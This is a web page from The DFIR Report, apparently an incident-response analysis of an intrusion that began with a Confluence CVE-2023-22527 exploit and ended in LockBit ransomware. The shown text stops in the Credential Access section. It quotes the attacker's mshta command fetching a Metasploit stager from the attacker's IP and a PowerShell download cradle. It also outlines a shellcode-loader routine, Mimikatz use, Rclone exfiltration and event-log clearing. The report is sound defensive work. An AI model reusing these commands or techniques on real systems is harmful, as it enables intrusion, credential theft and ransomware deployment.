        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>								</nav><!-- #site-navigation -->
            			</div>
        				</div><!-- .wrap -->
     				</div><!-- .navigation-top -->
				<div class="clock"> 
					<div id="time"></div>
					<div id="date">Tuesday, February 25, 2025</div>
				</div>
				</div><!-- #nav-sticker -->
				       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			</div><!-- .main-header-brand -->
						
							</div><!-- .main-header -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="site-content-cell">
						<div class="wrap wrap-width">

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		
<article id="post-42179" class="post-42179 post type-post status-publish format-standard hentry category-exploit category-lockbit category-ransomware entry">
	
	<div class="entry-content-holder">
		<header class="entry-header">

		
				<div class="entry-meta">

					
		<span class="cat-links">
		
			<a class="category-color-34" href="https://thedfirreport.com/category/exploit/">exploit</a>
		
			<a class="category-color-137" href="https://thedfirreport.com/category/lockbit/">lockbit</a>
		
			<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
				</span>
	
				</div><!-- .entry-meta -->
			<h1 class="entry-title">Confluence Exploit Leads to LockBit Ransomware</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/" rel="bookmark"><time class="entry-date published" datetime="2025-02-24T00:06:37+00:00">February 24, 2025</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		
<h2 class="wp-block-heading">Key Takeaways</h2>



<ul class="wp-block-list">
<li>The intrusion began with the exploitation of CVE-2023-22527 on an exposed Windows Confluence server, ultimately leading to the deployment of LockBit ransomware across the environment.</li>



<li>The threat actor leveraged various tools, including Mimikatz, Metasploit, and AnyDesk.</li>



<li>The threat actor leveraged RDP for lateral movement, deploying LockBit ransomware through multiple methods, including copying files over SMB shares for remote execution and automated distribution via PDQ Deploy.</li>



<li>Sensitive data was exfiltrated using Rclone, transferring files to <a href="https://MEGA.io" target="_blank" rel="noreferrer noopener">MEGA.io</a> cloud storage.</li>



<li>The intrusion had a rapid Time to Ransom (TTR) of around just two hours.</li>
</ul>
<h2 class="wp-block-heading"><a href="https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/#services" target="_blank" rel="noreferrer noopener">The DFIR Report Services</a></h2>
<p>Explore <a href="https://store.thedfirreport.com/products/confluence-exploit-leads-to-lockbit-ransomware-private-case-27244" target="_blank" rel="noopener">this case</a> in-depth with our hands-on DFIR Labs!</p>
<p>

</p>
<ul class="wp-block-list">
<li><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noreferrer noopener">Private Threat Briefs</a>: 20+ private DFIR reports annually.</li>



<li><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noreferrer noopener">Threat Feed</a>: Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>



<li><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noreferrer noopener">All Intel</a>: Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel.</li>



<li><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noreferrer noopener">Private Sigma Ruleset</a>: Features 170+ Sigma rules derived from 50+ cases, mapped to ATT&amp;CK with test examples.</li>



<li><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>: Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>

<h4>Table of Contents:</h4>
<ul>
<li><a href="#case-summary">Case Summary</a></li>
<li><a href="#analysts">Analysts</a></li>
<li><a href="#initial-access">Initial Access</a></li>
<li><a href="#execution">Execution</a></li>
<li><a href="#persistence">Persistence</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#defense-evasion">Defense Evasion</a></li>
<li><a href="#credential-access">Credential Access</a></li>
<li><a href="#discovery">Discovery</a></li>
<li><a href="#lateral-movement">Lateral Movement</a></li>
<li><a href="#collection">Collection</a></li>
<li><a href="#command-and-control">Command and Control</a></li>
<li><a href="#exfiltration">Exfiltration</a></li>
<li><a href="#impact">Impact</a></li>
<li><a href="#timeline">Timeline</a></li>
<li><a href="#diamond-model">Diamond Model</a></li>
<li><a href="#indicators">Indicators</a></li>
<li><a href="#detections">Detections</a></li>
<li><a href="#mitre">MITRE ATT&amp;CK</a></li>
</ul>



<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>



<p>The intrusion started with the exploitation of CVE-2023-22527, a critical remote code execution vulnerability in Confluence, against a Windows server. The first indication of threat actor activity was the execution of system discovery commands, including net user and whoami.</p>



<p>Shortly after, the threat actor attempted to download AnyDesk via curl, but the attempt initially failed. They then pivoted to using mshta to retrieve a remote HTA file containing a Metasploit stager. After establishing command and control with the Metasploit server, they leveraged it to successfully download and install AnyDesk. Once installed, AnyDesk was configured with a preset password, providing the threat actor with persistent remote access.</p>



<p>Within ten minutes, the threat actor began process enumeration using tasklist, identifying several processes of interest, which they then terminated. We assess that these processes belonged to a prior threat actor, and by killing them, the attacker ensured exclusive control over the server. Notably, they terminated PowerShell, inadvertently killing their own Metasploit process. This forced them to rerun the exploit to drop a new Metasploit stager and reestablish command and control. After regaining access, they created a new local account and added it to the Administrators group.</p>



<p>They accessed the beachhead host via rdp, using a newly created local account and then executed Mimikatz. Next, they leveraged SoftPerfect&#8217;s NetScan to enumerate remote hosts across the network. Using this information, they targeted a backup server, moving laterally via RDP using the default Administrator account.</p>



<p>On the backup server, the threat actor executed a PowerShell script, Veeam-Get-Creds-New.ps1, to extract Veeam credentials. They then pivoted to a file share server via RDP. Once on the file server, they deployed Rclone to exfiltrate data to <a href="https://MEGA.io" target="_blank" rel="noreferrer noopener">MEGA.io</a>. Following the exfiltration, they cleared all Windows event logs on the file server.</p>



<p>The threat actors then pivoted to a domain controller via RDP using domain administrator credentials. Once on the domain controller, they enumerated domain administrator group memberships. Meanwhile, they returned to the backup server to review its configuration.</p>



<p>Shortly after, the threat actor launched LockBit ransomware across the environment. They began by manually executing the ransomware on a backup server and a file share server over their active RDP sessions. To ensure widespread encryption, they then shifted to the beachhead host, where they leveraged PDQ Deploy, a legitimate enterprise deployment tool, to automate ransomware distribution across the rest of the network.</p>





<p>Using PDQ Deploy, the threat actors distributed the ransomware binary and a batch script to remote hosts over SMB. They then remotely executed the script via PDQ, triggering ransomware deployment across multiple systems. Next, they pivoted to an Exchange server.</p>





<p>On the Exchange server, the threat actor stopped key services using net stop and taskkill. They then deployed a ransomware binary alongside a new batch script, which, when executed, initiated ransomware encryption. This script was designed to mount remote systems&#8217; C$ shares, effectively enabling a secondary encryption wave—a failsafe mechanism in case PDQ Deploy had missed any targets.</p>





<p>The Time to Ransomware (TTR) was just over 2 hours (02:06:14), making it an extremely rapid intrusion.</p>



<p>If you would like to get an email when we publish a new report, please subscribe <a href="https://thedfirreport.com/subscribe/" target="_blank" rel="noreferrer noopener">here</a>.</p>





<h2 id="analysts" class="wp-block-heading"><a href="#analysts">Analysts</a></h2>



<p>Analysis and reporting completed by <a href="https://www.linkedin.com/in/angelo-violetti/" target="_blank" rel="noreferrer noopener">Angelo Violetti</a>, <a href="https://x.com/malforsec" target="_blank" rel="noreferrer noopener">@malforsec</a>, <a href="https://x.com/RoxpinTeddy" target="_blank" rel="noreferrer noopener">teddy_ROxPin</a></p>



<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>



<p>In early February 2024, we identified a security breach originating from an exposed Windows server. The server was compromised through a Confluence remote code execution (RCE) vulnerability that was disclosed on January 16, 2024.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_001.jpg"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-42255" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_001.jpg" alt="" width="1717" height="1109" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_001.jpg 1717w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_001-300x194.jpg 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_001-1024x661.jpg 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_001-768x496.jpg 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_001-1536x992.jpg 1536w" sizes="(max-width: 1717px) 100vw, 1717px" /></a></p>





<p><strong>Confluence RCE Exploitation</strong></p>



<p>The threat actor initially gained access by exploiting a server-side template injection vulnerability (<a href="https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html" target="_blank" rel="noreferrer noopener">CVE-2023-22527</a>, CVSS 10.0) in an exposed Atlassian Confluence server. This vulnerability allows an unauthenticated threat actor to execute arbitrary commands on the target server by injecting OGNL expressions. The exploitation started from the IP address 92[.]51.2.22 as shown by the following Suricata alert.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_002.png"><img decoding="async" class="aligncenter size-full wp-image-42254" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_002.png" alt="" width="1714" height="850" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_002.png 1714w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_002-300x149.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_002-1024x508.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_002-768x381.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_002-1536x762.png 1536w" sizes="(max-width: 1714px) 100vw, 1714px" /></a></p>





<p>The first commands executed by the threat actor were net user and whoami. These were used to enumerate the user accounts on the compromised Windows server and to gather information about the currently affected user. Moreover, the exploitation was likely made through a Python script based on the user-agent used.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_003.png"><img decoding="async" class="aligncenter size-full wp-image-42253" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_003.png" alt="" width="2000" height="1121" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_003.png 2000w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_003-300x168.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_003-1024x574.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_003-768x430.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_003-1536x861.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px" /></a></p>





<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42252" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_004.png" alt="" width="2001" height="789" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_004.png 2001w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_004-300x118.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_004-1024x404.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_004-768x303.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_004-1536x606.png 1536w" sizes="auto, (max-width: 2001px) 100vw, 2001px" /></a></p>



<p>The vulnerability arises from improper handling of user-supplied input within certain template files in Confluence. Specifically, files like confluence/template/xhtml/pagelist.vm accept parameters that are passed to potentially dangerous functions without sufficient sanitization. For instance, the $stack.findValue function can be manipulated to inject malicious Object-Graph Navigation Language (OGNL) expressions, leading to arbitrary code execution. Threat actors can exploit this vulnerability by sending crafted HTTP POST requests to specific endpoints, such as /template/aui/text-inline.vm, with malicious payloads in the parameters. Additional details about the vulnerability can be found in those reports: <a href="https://www.trendmicro.com/en_us/research/24/b/unveiling-atlassian-confluence-vulnerability-cve-2023-22527--und.html" target="_blank" rel="noreferrer noopener">Trend Micro</a> and <a href="https://www.splunk.com/en_us/blog/security/security-insights-tracking-confluence-cve-2023-22527.html" target="_blank" rel="noreferrer noopener">Splunk</a>.</p>



<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>



<p>After running initial discovery commands the threat actor attempted to download an AnyDesk installer from their server using the exploit.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42251" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_005.png" alt="" width="1827" height="468" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_005.png 1827w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_005-300x77.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_005-1024x262.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_005-768x197.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_005-1536x393.png 1536w" sizes="auto, (max-width: 1827px) 100vw, 1827px" /></a></p>





<p>The execution of curl failed to download the AnyDesk installer though. This did not stop the threat actor who later successfully downloaded an AnyDesk installer by other means.</p>



<h4 class="wp-block-heading">Meterpreter</h4>



<p>Approximately ten minutes after gaining initial access, the threat actor leveraged the native Windows mshta.exe utility to download and execute a Metasploit stager.</p>



<pre class="wp-block-preformatted">mshta http://92.51.2[.]22:443/UsySLX1n.hta
</pre>



<p>As outlined in the <a href="https://lolbas-project.github.io/lolbas/Binaries/Mshta/" target="_blank" rel="noreferrer noopener">lolbas</a> project, this technique enables the threat actor to drop a payload into the INetCache directory and execute it directly from there, leveraging trusted system utilities to evade detection.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42250" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_006.png" alt="" width="963" height="192" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_006.png 963w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_006-300x60.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_006-768x153.png 768w" sizes="auto, (max-width: 963px) 100vw, 963px" /></a></p>





<p>The HTA file executes an encoded PowerShell command.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42249" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_007.png" alt="" width="1762" height="177" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_007.png 1762w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_007-300x30.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_007-1024x103.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_007-768x77.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_007-1536x154.png 1536w" sizes="auto, (max-width: 1762px) 100vw, 1762px" /></a></p>





<p>The contents of the HTA file:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42248" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_008.png" alt="" width="1588" height="884" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_008.png 1588w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_008-300x167.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_008-1024x570.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_008-768x428.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_008-1536x855.png 1536w" sizes="auto, (max-width: 1588px) 100vw, 1588px" /></a></p>





<p>This encoded command spawns another PowerShell process with an obfuscated command line.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42247" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_009.png" alt="" width="2000" height="343" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_009.png 2000w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_009-300x51.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_009-1024x176.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_009-768x132.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_009-1536x263.png 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px" /></a></p>





<p>To deobfuscate the command line, it&#8217;s necessary to:</p>



<ul class="wp-block-list">
<li>Remove the + symbol, which concatenates strings.</li>



<li>Replace {0}, {1} and {2} respectively with =, 6 and P.</li>



<li>Base64 decode the resulting string.</li>



<li>Gzip decompress the base64 decoded string.</li>
</ul>



<p>The result is the following PS script, which performs the following actions:</p>



<ol class="wp-block-list">
<li>Gets the pointers to specific Windows API functions: <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" target="_blank" rel="noreferrer noopener">VirtualAlloc()</a>, VirtualProtect(), CreateThread() and WaitForSingleObject().</li>



<li>Allocates a new region of memory via VirtualAlloc() with PAGE_EXECUTE_READWRITE (0x40) permissions.</li>



<li>Copies a base64 decoded Metasploit shellcode into the newly allocated region of memory.</li>



<li>Changes the protection of the new memory region into PAGE_EXECUTE (0x10).</li>



<li>Creates a new thread pointing to the start of the new memory region to execute the Metasploit shellcode.</li>



<li>Waits for the end of the shellcode execution.</li>
</ol>





<p>&nbsp;</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42246" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_010.png" alt="" width="1937" height="428" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_010.png 1937w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_010-300x66.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_010-1024x226.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_010-768x170.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_010-1536x339.png 1536w" sizes="auto, (max-width: 1937px) 100vw, 1937px" /></a></p>
<p>The Metasploit shellcode can be emulated through <a href="https://github.com/mandiant/speakeasy" target="_blank" rel="noreferrer noopener">speakeasy</a> to identify the command and control server.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42245" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_011.png" alt="" width="1636" height="433" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_011.png 1636w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_011-300x79.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_011-1024x271.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_011-768x203.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_011-1536x407.png 1536w" sizes="auto, (max-width: 1636px) 100vw, 1636px" /></a></p>





<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>



<p>As part of the AnyDesk installation on the beachhead, a service was installed to ensure the instance became available again after a restart. The following PowerShell command was executed to download AnyDesk:</p>



<pre class="wp-block-preformatted">powershell -c (New-Object Net.WebClient).DownloadFile('http://download.anydesk.com/AnyDesk.msi', 'AnyDesk.msi')
</pre>



<p>The Windows System event 7045 shows service creations. The details show that AnyDeskMSI.exe will be started, and the start type is set to auto, so it will run after a restart of the server.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42244" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_012.png" alt="" width="520" height="142" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_012.png 520w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_012-300x82.png 300w" sizes="auto, (max-width: 520px) 100vw, 520px" /></a></p>





<p>The threat actor used both valid accounts and created a new account on the beachhead host. The user &#8220;backup&#8221; was created, given a password, and added to the local &#8220;Administrator&#8221; group. Sysmon event code 1 shows the commands ran to perform the activity:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42243" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_013.png" alt="" width="327" height="65" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_013.png 327w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_013-300x60.png 300w" sizes="auto, (max-width: 327px) 100vw, 327px" /></a></p>





<p>Windows Security events 4720 “A user account was created” and 4732 “A member was added to security enabled local group” show the creation of the user and then adding the user to the Administrators group. As the username does not show in the 4732 event. Make sure to compare the unique Security Identifier(SID):</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42242" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_014.png" alt="" width="485" height="195" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_014.png 485w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_014-300x121.png 300w" sizes="auto, (max-width: 485px) 100vw, 485px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42240" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_016.png" alt="" width="485" height="262" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_016.png 485w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_016-300x162.png 300w" sizes="auto, (max-width: 485px) 100vw, 485px" /></a></p>
<p>&nbsp;</p>







<h2 id="privilege-escalation" class="wp-block-heading"><a href="#privilege-escalation">Privilege Escalation</a></h2>



<p>Confluence RCE provided SYSTEM access to the beachhead. This was utilized to create a local administrator user named &#8216;backup&#8217;. With the &#8216;backup&#8217; user, the threat actor was able to RDP to the beachhead with a proxy connection via their Metasploit payload and execute mimikatz. The mimikatz execution resulted in the disclosure of an easily crackable hash for the &#8216;Administrator&#8217; account on the beachhead. Unfortunately, this password was re-used across the hosts in the environment. Utilizing the &#8216;Administrator&#8217; account on a File Server, the threat actor was able to locate cleartext credentials for other privileged accounts account (see &#8216;<a href="#credential-access">Credential Access</a>&#8216;).</p>



<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>



<p>Through their RDP session on the beachhead, the threat actor typed &#8216;virus&#8217; in the start menu search to navigate to the &#8216;Virus &amp; threat protection&#8217; settings to ensure Windows Defender was completely turned off.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42239" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_017.png" alt="" width="273" height="65" /></a></p>
<p>&nbsp;</p>





<p>After exfiltrating data off the file server via Rclone, the Windows event logs were cleared via PowerShell:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42238" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_018.png" alt="" width="506" height="54" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_018.png 506w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_018-300x32.png 300w" sizes="auto, (max-width: 506px) 100vw, 506px" /></a></p>





<p>The wevtutil switches used:</p>



<p>el | enum-logs List log names</p>



<p>cl | clear-log Clear a log</p>



<p>The threat actor also deleted the files they brought into the environment:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42237" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_019.png" alt="" width="837" height="581" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_019.png 837w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_019-300x208.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_019-768x533.png 768w" sizes="auto, (max-width: 837px) 100vw, 837px" /></a></p>





<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>



<p>Mimikatz was executed on the beachhead host just 20 minutes after initial access was performed. This was visible in the memory on the host as Anydesk wrote the file to disk.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42236" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_020.png" alt="" width="850" height="724" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_020.png 850w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_020-300x256.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_020-768x654.png 768w" sizes="auto, (max-width: 850px) 100vw, 850px" /></a></p>





<figure class="wp-block-image"></figure>
